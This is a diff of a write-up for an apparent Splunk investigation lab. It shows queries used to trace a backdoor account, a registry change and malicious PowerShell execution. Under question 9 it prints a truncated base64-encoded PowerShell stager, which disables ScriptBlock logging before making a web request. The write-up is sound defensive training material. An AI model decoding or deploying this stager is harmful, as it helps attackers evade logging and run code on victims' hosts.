@@ -34,7 +34,7 @@ index=main
 ```
 <br/>
 
-**2. On one of the infected hosts, the adversary was successful in creating a backdoor user. What is the new username?**
+**2. On one of the infected hosts, the adversary was successful in creating a backdoor user. What is the new username?** <br/>
 Since we know that a new account has been created we can filter for this specific type of event. After searching it up i found that the ID for that event is "4720".
 Let's add it to the search and give a look at the only log that appears, we can see the new user name.
 ```
@@ -42,7 +42,7 @@ index=main EventID="4720"
 ```
 <br/>
 
-**3. On the same host, a registry key was also updated regarding the new backdoor user. What is the full path of that registry key?**
+**3. On the same host, a registry key was also updated regarding the new backdoor user. What is the full path of that registry key?** <br/>
 In this case we have to change the eventID to 13, we can also add the new user name to the search to better filter the results.
 ```
 index=main EventID="13" A1berto
@@ -50,11 +50,11 @@ index=main EventID="13" A1berto
 <br/>
 
 
-**4. Examine the logs and identify the user that the adversary was trying to impersonate.**
+**4. Examine the logs and identify the user that the adversary was trying to impersonate.** <br/>
 Checking the user field on the left side we notice that there is a legitimate user with a very similar name.
 <br/>
 
-**5. What is the command used to add a backdoor user from a remote computer?**
+**5. What is the command used to add a backdoor user from a remote computer?** <br/>
 This time we are searching the system logs events which id is 1.
 ```
 index=main EventID="1"
@@ -62,28 +62,28 @@ index=main EventID="1"
 Now there are 25 logs to analyze but, checking on the left side, the **CommandLine** filter shows 4 commands and we can identify the one we are interested in
 <br/>
 
-**6. How many times was the login attempt from the backdoor user observed during the investigation?**
+**6. How many times was the login attempt from the backdoor user observed during the investigation?** <br/>
 We can filter for events related to the fake user and notice that there are no events, this means we have observed 0 events.
 ```
 index=main User="A1berto"
 ```
 <br/>
 
-**7. What is the name of the infected host on which suspicious PowerShell commands were executed?**
+**7. What is the name of the infected host on which suspicious PowerShell commands were executed?** <br/>
 Le'ts search Powershell and than use the **Hostname** filter on the left side, we can see there is only one value:
 ```
 index=main Powershell
 ```
 <br/>
 
-**8. PowerShell logging is enabled on this device. How many events were logged for the malicious PowerShell execution?**
+**8. PowerShell logging is enabled on this device. How many events were logged for the malicious PowerShell execution?** <br/>
 In Windows all the PowerShell commands are logged with the EventID 4103
 ```
 index=main EventID="4103"
 ```
 <br/>
 
-**9. An encoded PowerShell script from the infected host initiated a web request. What is the full URL?**
+**9. An encoded PowerShell script from the infected host initiated a web request. What is the full URL?** <br/>
 Further  analyzing the logs of question 5 we can notice some encoded data in base 64.
 ```
 SQBGACgAJABQAFMAVgBlAHIAUwBJAG8AbgBUAGEAYgBMAGUALgBQAFMAVgBFAHIAUwBJAE8ATgAuAE0AYQBKAE8AUgAgAC0ARwBlACAAMwApAHsAJAAxADEAQgBEADgAPQBbAHIAZQBGAF0ALgBBAFMAcwBlAE0AYgBsAHkALgBHAGUAdABUAHkAUABFACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AVQB0AGkAbABzACcAKQAuACIARwBFAFQARgBJAGUAYABsAGQAIgAoACcAYwBhAGMAaABlAGQARwByAG8AdQBwAFAAbwBsAGkAYwB5AFMAZQB0AHQAaQBuAGcAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEkARgAoACQAMQAxAEIAZAA4ACkAewAkAEEAMQA4AEUAMQA9ACQAMQAxAEIARAA4AC4ARwBlAHQAVgBhAEwAVQBFACgAJABuAFUAbABMACkAOwBJAGYAKAAkAEEAMQA4AGUAMQBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdACkAewAkAEEAMQA4AGUAMQBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABhADEAOABlADEAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQBbACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnAF0APQAwAH0AJAB2AEEATAA9AFsAQwBvAEwAbABlAGMAdABpAE8ATgBTAC4ARwBlAE4ARQByAGkAQwAuAEQASQBjAFQAaQBPAG4AQQBSAFkAWwBTAHQAcgBJAE4ARwAsAFMAeQBzAFQARQBtAC4ATwBCAEoARQBjAHQAXQBdADoAOgBuAGUAVwAoACkAOwAkAHYAQQBMAC4AQQBkAEQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAFYAQQBMAC4AQQBkAGQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAYQAxADgAZQAxAFsAJwBIAEsARQBZAF8ATABPAEMAQQBMAF8ATQBBAEMASABJAE4ARQBcAFMAbwBmAHQAdwBhAHIAZQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAFAAbwB3AGUAcgBTAGgAZQBsAGwAXABTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAkAFYAQQBsAH0ARQBMAHMARQB7AFsAUwBjAFIAaQBwAFQAQgBsAE8AQwBLAF0ALgAiAEcAZQBUAEYASQBFAGAATABkACIAKAAnAHMAaQBnAG4AYQB0AHUAcgBlAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAdABWAEEAbABVAGUAKAAkAE4AdQBMAE
